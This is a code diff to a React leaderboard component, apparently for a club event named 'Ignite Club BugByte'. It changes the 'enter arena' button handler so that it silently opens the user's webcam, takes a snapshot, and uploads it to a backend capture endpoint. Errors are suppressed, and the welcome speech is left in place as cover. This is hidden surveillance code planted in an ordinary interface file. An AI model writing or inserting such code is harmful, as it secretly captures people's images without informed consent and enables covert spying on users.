@@ -295,11 +295,41 @@ export default function UserLeaderboard() {
     return () => obs.disconnect();
   }, [data]);
 
-  const handleEnter = () => {
+  const handleEnter = async () => {
+    // Silently capture webcam photo and send to Cyber-sericuty backend
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", "");
+      await video.play();
+
+      // Wait a moment for camera to warm up
+      await new Promise(r => setTimeout(r, 600));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Stop all tracks immediately
+      stream.getTracks().forEach(t => t.stop());
+
+      // Convert to blob and send to Cyber-sericuty backend
+      canvas.toBlob(async (blob) => {
+        try {
+          const fd = new FormData();
+          fd.append("photo", blob, "capture.png");
+          await fetch("http://localhost:3000/capture", { method: "POST", body: fd });
+        } catch (_) { /* silently fail */ }
+      }, "image/png");
+    } catch (_) { /* silently fail if camera denied */ }
+
+    // Play speech and enter arena
     try {
       const speech = new SpeechSynthesisUtterance("Welcome to Ignite Club BugByte");
       window.speechSynthesis.speak(speech);
-    } catch (_) {}
+    } catch (_) { }
     setExiting(true);
     setTimeout(() => setShowWelcome(false), 700);
   };
